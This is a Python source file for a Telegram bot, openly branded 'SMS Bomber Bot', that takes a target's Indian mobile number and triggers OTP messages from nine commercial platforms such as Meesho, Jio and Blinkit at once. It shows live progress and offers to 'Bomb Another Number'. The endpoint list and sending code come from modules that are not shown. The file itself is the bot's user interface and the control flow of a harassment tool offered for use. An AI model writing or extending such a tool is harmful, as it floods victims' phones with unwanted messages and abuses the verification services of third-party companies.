#!/usr/bin/env python3
# ─────────────────────────────────────────────────────────────
#  bot.py — Telegram SMS Bot with inline buttons & decorations
# ─────────────────────────────────────────────────────────────

from __future__ import annotations

import asyncio
import logging
import os
import re
import sys

from dotenv import load_dotenv
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

from endpoints import ENDPOINTS
from sender import fire_all, build_summary

# ── Load env & configure ─────────────────────────────────────
load_dotenv()
TOKEN = os.getenv("BOT_TOKEN", "")

logging.basicConfig(
    format="%(asctime)s │ %(levelname)-7s │ %(message)s",
    level=logging.INFO,
)
log = logging.getLogger(__name__)

# ── State tracking ────────────────────────────────────────────
# { chat_id: { "awaiting_phone": bool, "busy": bool } }
user_state: dict[int, dict] = {}


# ═════════════════════════════════════════════════════════════
#  DECORATIVE MESSAGE BUILDERS
# ═════════════════════════════════════════════════════════════

WELCOME_TEXT = """
🔥 *━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━*

         💣  *SMS BOMBER BOT*  💣

🔥 *━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━*

  Triggers OTP from *{count} platforms* simultaneously
  
  🛍️ Meesho  •  🏦 Ram Fincorp  •  🚗 Maruti Suzuki
  🏠 NoBroker  •  🎫 District  •  📦 Delhivery
  🎬 BookMyShow  •  ⚡ Blinkit  •  📱 Jio

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""".format(count=len(ENDPOINTS))

ENTER_PHONE_TEXT = """
📲 *Enter Mobile Number*

╭─────────────────────────────╮
│  Send a *10-digit* Indian    │
│  mobile number to proceed    │
╰─────────────────────────────╯

_Example:_ `9876543210`
"""

INVALID_PHONE_TEXT = """
⚠️ *Invalid Number!*

╭─────────────────────────────╮
│  Must be exactly *10 digits*  │
│  starting with *6, 7, 8, 9*  │
╰─────────────────────────────╯

_Try again or press_ /start
"""

HELP_TEXT = """
ℹ️ *━━━━ HELP & COMMANDS ━━━━*

/start  —  Launch the bot
/help   —  Show this message
/stop   —  Cancel current operation

*How it works:*
1️⃣  Press *🚀 Start Bombing*
2️⃣  Enter a 10-digit number
3️⃣  Bot fires OTP from 9 sites
4️⃣  Get a live status report

*━━━━━━━━━━━━━━━━━━━━━━━━━━━*
"""


def main_keyboard() -> InlineKeyboardMarkup:
    """Main menu inline keyboard."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bomb")],
        [
            InlineKeyboardButton("📋 Endpoints List", callback_data="list_eps"),
            InlineKeyboardButton("ℹ️ Help", callback_data="help"),
        ],
    ])


def back_keyboard() -> InlineKeyboardMarkup:
    """Back to menu keyboard."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="menu")],
    ])


def confirm_keyboard(phone: str) -> InlineKeyboardMarkup:
    """Confirm fire keyboard."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"💣 Confirm — Fire to {phone}", callback_data=f"fire_{phone}")],
        [InlineKeyboardButton("❌ Cancel", callback_data="menu")],
    ])


def again_keyboard() -> InlineKeyboardMarkup:
    """Post-fire keyboard."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔁 Bomb Another Number", callback_data="start_bomb")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu")],
    ])


# ═════════════════════════════════════════════════════════════
#  HANDLERS
# ═════════════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle /start command."""
    cid = update.effective_chat.id
    user_state[cid] = {"awaiting_phone": False, "busy": False}

    await update.message.reply_text(
        WELCOME_TEXT,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=main_keyboard(),
    )


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle /help command."""
    await update.message.reply_text(
        HELP_TEXT,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=back_keyboard(),
    )


async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command."""
    cid = update.effective_chat.id
    user_state[cid] = {"awaiting_phone": False, "busy": False}
    await update.message.reply_text(
        "🛑 *Operation cancelled.*\n\nPress /start to begin again.",
        parse_mode=ParseMode.MARKDOWN,
    )


async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle all inline button callbacks."""
    query = update.callback_query
    await query.answer()
    data = query.data
    cid = query.message.chat_id

    if cid not in user_state:
        user_state[cid] = {"awaiting_phone": False, "busy": False}

    # ── Main menu ─────────────────────────────────────────────
    if data == "menu":
        user_state[cid] = {"awaiting_phone": False, "busy": False}
        await query.edit_message_text(
            WELCOME_TEXT,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=main_keyboard(),
        )

    # ── Start bombing → ask for phone ─────────────────────────
    elif data == "start_bomb":
        if user_state[cid].get("busy"):
            await query.answer("⏳ Already firing! Please wait.", show_alert=True)
            return
        user_state[cid]["awaiting_phone"] = True
        await query.edit_message_text(
            ENTER_PHONE_TEXT,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=back_keyboard(),
        )

    # ── List endpoints ────────────────────────────────────────
    elif data == "list_eps":
        lines = ["📋 *━━━━ LOADED ENDPOINTS ━━━━*\n"]
        for i, ep in enumerate(ENDPOINTS, 1):
            lines.append(f"  *{i}.* {ep['name']}  •  `{ep['method']}`  •  ~{ep['cooldown']}s cd")
        lines.append("\n*━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━*")
        await query.edit_message_text(
            "\n".join(lines),
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=back_keyboard(),
        )

    # ── Help ──────────────────────────────────────────────────
    elif data == "help":
        await query.edit_message_text(
            HELP_TEXT,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=back_keyboard(),
        )

    # ── Confirm fire ──────────────────────────────────────────
    elif data.startswith("fire_"):
        phone = data[5:]
        if user_state[cid].get("busy"):
            await query.answer("⏳ Already firing! Please wait.", show_alert=True)
            return

        user_state[cid]["busy"] = True
        user_state[cid]["awaiting_phone"] = False

        # ── Send initial status message ───────────────────────
        status_text = (
            f"⏳ *Launching bombardment...*\n\n"
            f"📱 Target: `{phone}`\n"
            f"🎯 Endpoints: *{len(ENDPOINTS)}*\n\n"
            f"{'⬜' * len(ENDPOINTS)}  0/{len(ENDPOINTS)}"
        )
        await query.edit_message_text(
            status_text,
            parse_mode=ParseMode.MARKDOWN,
        )

        # ── Fire all and collect ──────────────────────────────
        completed = []

        async def on_result(result, idx, total):
            completed.append(result)
            done = len(completed)

            progress = "🟩" * done + "⬜" * (total - done)
            lines = [
                f"⏳ *Firing in progress...*\n",
                f"📱 Target: `{phone}`",
                f"\n{progress}  {done}/{total}\n",
            ]

            for r in completed:
                if r.success:
                    lines.append(f"  ✅ {r.name}")
                else:
                    lines.append(f"  ❌ {r.name}")

            try:
                await query.edit_message_text(
                    "\n".join(lines),
                    parse_mode=ParseMode.MARKDOWN,
                )
            except Exception:
                pass  # Telegram rate-limits edits; ignore

        results = await fire_all(phone, on_result=on_result)

        # ── Final summary ─────────────────────────────────────
        summary = build_summary(results, phone)
        await query.edit_message_text(
            summary,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=again_keyboard(),
        )

        user_state[cid]["busy"] = False


async def phone_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle text messages — expecting a phone number."""
    cid = update.effective_chat.id
    state = user_state.get(cid, {})

    if not state.get("awaiting_phone"):
        # Not expecting a phone number — show help
        await update.message.reply_text(
            "👋 Press /start to begin!",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    phone = update.message.text.strip()

    # Validate: exactly 10 digits, starts with 6-9
    if not re.match(r'^[6-9]\d{9}$', phone):
        await update.message.reply_text(
            INVALID_PHONE_TEXT,
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # ── Ask confirmation ──────────────────────────────────────
    confirm_text = f"""
🎯 *━━━━ CONFIRM TARGET ━━━━*

📱 *Number:* `{phone}`
🎯 *Endpoints:* {len(ENDPOINTS)} platforms
⏱️ *ETA:* ~15 seconds

*━━━━━━━━━━━━━━━━━━━━━━━━━━━*
"""
    await update.message.reply_text(
        confirm_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=confirm_keyboard(phone),
    )


# ═════════════════════════════════════════════════════════════
#  MAIN
# ═════════════════════════════════════════════════════════════

def main():
    if not TOKEN or TOKEN == "your_telegram_bot_token_here":
        print("❌ Set BOT_TOKEN in .env file!")
        print("   1. Create a bot via @BotFather on Telegram")
        print("   2. Copy the token")
        print("   3. Paste it in bot/.env as BOT_TOKEN=<token>")
        sys.exit(1)

    log.info("🚀 Starting SMS Bomber Bot...")
    log.info(f"📋 Loaded {len(ENDPOINTS)} endpoints")

    app = Application.builder().token(TOKEN).build()

    # Register handlers
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, phone_handler))

    log.info("✅ Bot is running! Press Ctrl+C to stop.")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
